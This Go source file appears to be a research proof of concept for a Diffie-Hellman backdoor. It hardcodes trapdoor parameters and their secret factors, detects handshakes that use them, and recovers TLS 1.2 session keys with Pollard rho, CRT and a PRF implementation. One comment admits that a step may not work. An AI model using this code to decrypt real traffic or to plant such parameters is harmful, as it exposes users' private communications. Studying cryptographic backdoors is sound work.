package main

import(
	"log"
	"github.com/mimoo/GoNTL"
	//"crypto/tls"
	"crypto/hmac"
	"crypto/sha256"
	"hash"
	"math/big"
)

// the backdoor parameters
var dh1024_n = [128]byte{0x9b, 0xd3, 0x3, 0x0, 0x31, 0xd1, 0xdb, 0x22, 0x87, 0xef, 0x9e, 0x74, 0xc9, 0xab, 0x7b, 0x64, 0x6e, 0x38, 0xbc, 0x51, 0x96, 0x90, 0x1b, 0x1d, 0x5e, 0x5f, 0x1a, 0x51, 0x27, 0xf7, 0x48, 0x4e, 0xc9, 0xb0, 0x3f, 0x3a, 0x53, 0x8c, 0xf0, 0x7e, 0xf0, 0xee, 0xc9, 0x47, 0x95, 0xd1, 0xa, 0xbe, 0xe2, 0x74, 0x74, 0x61, 0x14, 0xb5, 0x7e, 0x3d, 0x7c, 0xbd, 0xbf, 0xed, 0xc2, 0x5a, 0xb8, 0xe6, 0x39, 0x8a, 0xae, 0xd5, 0x61, 0x46, 0x4b, 0x99, 0x5a, 0x93, 0x9e, 0x84, 0xeb, 0x86, 0x85, 0xe7, 0x97, 0x5f, 0xf9, 0x1e, 0xa1, 0xd5, 0xf0, 0xd8, 0x6a, 0x9d, 0x22, 0xa8, 0x49, 0x25, 0x6, 0x4a, 0x15, 0xce, 0x3, 0x84, 0x74, 0x53, 0xbc, 0x42, 0xb4, 0xa7, 0xb, 0xc2, 0x2b, 0xf0, 0x24, 0xb6, 0xbd, 0x8a, 0x6a, 0xa9, 0x58, 0x8e, 0xbe, 0xf0, 0xd, 0x82, 0xc4, 0x39, 0xbb, 0xb9, 0x6a, 0xfd, }
var dh1024_g = [128]byte{0x2e, 0x42, 0x2f, 0x97, 0x72, 0x8c, 0xc9, 0xb3, 0x1, 0x1, 0x4c, 0x6e, 0xe5, 0x62, 0x4b, 0x37, 0xe4, 0x9c, 0xee, 0xd3, 0xee, 0xda, 0xf0, 0x52, 0xad, 0xc6, 0x29, 0x61, 0x56, 0xe5, 0x75, 0x90, 0xbb, 0x4f, 0x86, 0x5e, 0x87, 0xc6, 0x8c, 0x7f, 0x22, 0x21, 0xa6, 0x99, 0xeb, 0x3a, 0x2d, 0x92, 0x48, 0x36, 0xa1, 0x63, 0x3d, 0xd8, 0x99, 0x89, 0x1, 0x86, 0xf4, 0xec, 0xc1, 0xab, 0x79, 0x56, 0x60, 0x65, 0x8a, 0xca, 0xd2, 0xa7, 0x12, 0x7f, 0x3, 0x74, 0x5a, 0xa4, 0xed, 0x4e, 0xc3, 0x3a, 0xe4, 0xde, 0xdb, 0xa9, 0x12, 0x5f, 0x20, 0x54, 0x6f, 0x51, 0xe5, 0x42, 0x5d, 0xf9, 0x7d, 0x1, 0x74, 0xa0, 0x9f, 0xc2, 0xb6, 0x17, 0x41, 0xc3, 0xdf, 0x10, 0x36, 0x5a, 0x20, 0xe, 0x71, 0xe7, 0xe4, 0xa1, 0xce, 0xff, 0xae, 0x31, 0x25, 0xe9, 0x72, 0x1c, 0xae, 0x18, 0x20, 0xe2, 0xa1, 0x28, }

var p string = "7323720966914812591055941708221331966484585723722438709794411811359163268313938691329827951251267050560591642529907351637378159060836729528663195017591659"
var q string = "14940973346998489926743945066580524906625114387157803259698606478035694327084592182142273688331448815700547769593757798760429978677185604346516769767175479"
var p_small string = "897696227"
var q_small string = "2121852613"

// helper
func equality(a []byte, b []byte) (bool) {
	// bytes
	for index,_ := range a {
		if a[index] != b[index] {
			return false
		}
	}
	//
	return true
}

// backdoored parameters?
func backdoored(modulus []byte, generator []byte) (bool) {
	if len(dh1024_n) == len(modulus) && len(dh1024_g) == len(generator) &&
		equality(dh1024_n[:], modulus) && equality(dh1024_g[:], generator) {
		log.Println("backdoor detected!")
		return true
	} else {
		return false
	}
}


func pHash(result, secret, seed []byte, hash func() hash.Hash) {
	h := hmac.New(hash, secret)
	h.Write(seed)
	a := h.Sum(nil)
	
	j := 0
	for j < len(result) {
		h.Reset()
		h.Write(a)
		h.Write(seed)
		b := h.Sum(nil)
		todo := len(b)
		if j+todo > len(result) {
			todo = len(result) - j
			}
		copy(result[j:j+todo], b)
		j += todo
		
		h.Reset()
		h.Write(a)
		a = h.Sum(nil)
	}
}

// compute the 48 bytes master key from the pre master key
func get_masterSecret(preMasterSecret []byte, clientRandom []byte, serverRandom []byte) ([]byte) {
	// let's say version tls1.2, AES-128-CBC, sha256 to keep things simple

	// seed
	var label = []byte("master secret")
	seed := make([]byte, 0, len(label) + len(clientRandom) + len(serverRandom))
	seed = append(seed, label...)
	seed = append(seed, clientRandom...)
	seed = append(seed, serverRandom...)

	// PRF!
	masterSecret := make([]byte, 48)
	log.Println(" | preMasterSecret:", preMasterSecret)
	pHash(masterSecret, preMasterSecret, seed, sha256.New)

	log.Println(" | masterSecret :", masterSecret)
	
	return masterSecret
}

func get_keys(masterSecret []byte, clientRandom []byte, serverRandom []byte) ([]byte, []byte, []byte, []byte) {
	// let's say version tls1.2, AES-128-CBC, sha256 to keep things simple

	// seed
	var label = []byte("key expansion")
	seed := make([]byte, 0, len(label) + len(clientRandom) + len(serverRandom))
	seed = append(seed, label...)
	seed = append(seed, serverRandom[:]...)
	seed = append(seed, clientRandom[:]...)

	// PRF!
	keys := make([]byte, 32*2 + 16*2) // HMAC-256 take 256bit keys, AES-128 takes 128bit keys... // https://tools.ietf.org/html/rfc5246#appendix-C
	pHash(keys, masterSecret, seed, sha256.New)

	return keys[:32], keys[32:32*2], keys[32*2:32*2+16], keys[32*2+16:32*2+2*16]
}

// the attack
func attack(serverPubkey []byte, clientPubkey []byte, serverRandom []byte, clientRandom []byte) ([]byte, []byte, []byte, []byte){

	// convert to big.Int
	y := new(big.Int)
	y.SetBytes(serverPubkey)

	modulus := new(big.Int)
	modulus.SetBytes(dh1024_n[:])

	generator := new(big.Int)
	generator.SetBytes(dh1024_g[:])

	prime1 := new(big.Int)
	prime1.SetString(p, 10)

	prime2 := new(big.Int)
	prime2.SetString(q, 10)

	order1 := new(big.Int)
	order1.SetString(p_small, 10)

	order2 := new(big.Int)
	order2.SetString(q_small, 10)

	// divide the problem in p and q
	yp := new(big.Int)
	yp.Mod(y, prime1) // <-- this doesn't seem to work!

	yq := new(big.Int)
	yq.Mod(y, prime2)
	
	// Pollard Rho of each problem
	log.Println("pollard rho!")
	log.Println("y =", y.String())
	log.Println("yp =", yp.String())
	log.Println("g = ", generator.String())
	log.Println("p = ", prime1.String())
	log.Println("order =", order1.String())
	log.Println("n = ", modulus.String())
	xp := gontl.Pollard_Rho(yp, generator, prime1, order1, gontl.Big0, gontl.Big0)
	xq := gontl.Pollard_Rho(yq, generator, prime2, order2, gontl.Big0, gontl.Big0)

	// Remove qq=(q-1)/2, use pp=p-1
	pp := new(big.Int)
	pp.Sub(prime1, gontl.Big1)

	qq := new(big.Int)
	qq.Sub(prime2, gontl.Big1)

	rest := new(big.Int)
	rest.Set(modulus)
	
	qq.DivMod(qq, gontl.Big2, rest) // -> rest = 0

	// CRT
	log.Println("CRT!")
	x1 := gontl.CRT2(xp, xq, pp, qq)
	log.Println("found one solution", x1)
	// second solution
	
	plus := new(big.Int)
	plus.Mul(pp, qq)
	x2 := new(big.Int)
	x2.Add(x1, plus)

	// Compute the pre-master secret
	y2 := new(big.Int)
	y2.SetBytes(clientPubkey)
	log.Println("y2", y2.String())
	log.Println("x1", x1.String())
	log.Println("modulus", modulus.String())
		
	x1.Exp(y2, x1, modulus) // first solution
	log.Println("preMasterSecret:", x1)

	x2.Exp(y2, x2, modulus) // second solution

	// Compute the master_secret
	//masterSecret := get_masterSecret(x1.Bytes(), clientRandom, serverRandom)

	masterSecret := get_masterSecret(x2.Bytes(), clientRandom, serverRandom)

	// Derive the keys
	return get_keys(masterSecret, clientRandom, serverRandom)
}


